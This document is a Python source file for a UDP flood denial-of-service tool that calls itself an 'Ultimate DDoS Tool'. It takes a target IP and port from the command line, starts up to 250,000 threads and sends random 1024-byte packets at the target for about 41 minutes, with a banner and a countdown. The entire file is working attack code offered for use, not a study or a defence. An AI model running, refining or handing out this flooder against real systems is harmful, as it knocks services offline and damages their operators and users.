import sys
import socket
import threading
import time
import random
import os
from colorama import Fore, init

# Initialize colorama
init(autoreset=True)

# ASCII Art and Banner
KODOVY_ART = f"""
{Fore.RED}╦ ╦┌─┐┌─┐┌┬┐┬ ┬┌─┐╦  ╔═╗
{Fore.RED}║║║├┤ └─┐ │ │ │├─┘║  ║╣ 
{Fore.RED}╚╩╝└─┘└─┘ ┴ └─┘┴  ╩═╝╚═╝
{Fore.YELLOW}⚡ Ultimate DDoS Tool ⚡
{Fore.CYAN}➤ Version: 2.0 | Threads: 250K
{Fore.CYAN}➤ Author: KodoVY | GitHub: github.com/shacoder11

{Fore.RESET}{'━'*40}
"""

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    clear_screen()
    print(KODOVY_ART)

# Kodovy DDoS Configuration
if len(sys.argv) != 3:
    show_banner()
    print(f"{Fore.RED}✖ Error: Missing arguments!{Fore.RESET}")
    print(f"{Fore.YELLOW}Usage: python kodovy.py <IP> <PORT>{Fore.RESET}")
    print(f"{Fore.CYAN}Example: python kodovy.py 192.168.1.1 80{Fore.RESET}")
    sys.exit(1)

try:
    TARGET_IP = sys.argv[1]
    TARGET_PORT = int(sys.argv[2])
    FLOOD_DURATION = 2500  # ~41 minutes
    PACKET_SIZE = 1024
    THREAD_COUNT = 250000  # Increased thread count
except (ValueError, IndexError) as e:
    show_banner()
    print(f"{Fore.RED}✖ Invalid input: {e}{Fore.RESET}")
    sys.exit(1)

def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = bytearray(random.getrandbits(8) for _ in range(PACKET_SIZE))

    end_time = time.time() + FLOOD_DURATION
    packet_count = 0

    while time.time() < end_time:
        try:
            sock.sendto(bytes_to_send, (TARGET_IP, TARGET_PORT))
            packet_count += 1
        except:
            continue

def start_attack():
    show_banner()
    print(f"{Fore.GREEN}✔ Target: {Fore.WHITE}{TARGET_IP}:{TARGET_PORT}")
    print(f"{Fore.GREEN}✔ Duration: {Fore.WHITE}{FLOOD_DURATION} seconds")
    print(f"{Fore.GREEN}✔ Threads: {Fore.WHITE}{THREAD_COUNT:,}")
    print(f"{Fore.GREEN}✔ Packet Size: {Fore.WHITE}{PACKET_SIZE} bytes")
    print(f"{Fore.RED}\n[!] Attack started at {time.strftime('%H:%M:%S')}{Fore.RESET}")
    print("━"*40)

    threads = []
    for i in range(THREAD_COUNT):
        try:
            t = threading.Thread(target=udp_flood)
            t.daemon = True
            threads.append(t)
            t.start()
            if i % 5000 == 0:  # Show progress every 5k threads
                print(f"{Fore.YELLOW}⚡ Threads deployed: {i:,}/{THREAD_COUNT:,}", end='\r')
        except:
            continue

    # Attack duration countdown
    for remaining in range(FLOOD_DURATION, 0, -1):
        mins, secs = divmod(remaining, 60)
        print(f"{Fore.CYAN}⏳ Remaining: {mins:02d}:{secs:02d}", end='\r')
        time.sleep(1)

    print(f"\n{Fore.GREEN}✓ Attack completed at {time.strftime('%H:%M:%S')}{Fore.RESET}")
    sys.exit(0)

if __name__ == "__main__":
    start_attack()